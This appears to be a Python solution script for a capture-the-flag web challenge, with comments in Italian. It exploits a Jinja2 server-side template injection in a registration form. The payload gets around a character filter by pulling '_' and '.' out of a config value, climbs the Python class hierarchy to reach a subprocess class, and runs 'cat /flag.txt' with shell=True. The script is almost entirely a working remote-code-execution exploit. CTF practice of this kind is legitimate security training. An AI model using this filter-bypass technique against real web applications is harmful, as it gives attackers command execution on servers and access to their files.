import requests

url = 'http://flagdownloader.challs.olicyber.it/premium'

# SSTI nel form di registrazione, però vengono filtrati i caratter [., \, %, <, >, _] quindi il payload è più complesso
# config["FLAG"] = "sorry... the flag was moved in a file in the root folder ¯\_ツ_/¯"
payload = '{{ ""[config["FLAG"][61]*2 + "class" + config["FLAG"][61]*2][config["FLAG"][61]*2 + "mro" + config["FLAG"][61]*2][1][config["FLAG"][61]*2 + "subclasses" + config["FLAG"][61]*2]()[360]("cat /flag" + config["FLAG"][5] + "txt", shell=True, stdout=-1)["communicate"]()[0]}}'

res = requests.post(url, data={'inputEmail': 'user@example.it', 'inputPassword': '1234', 'inputAddress': payload, 'inputCreditCard': '1234'}, headers={'Content-Type': 'application/x-www-form-urlencoded'})

print(res.text)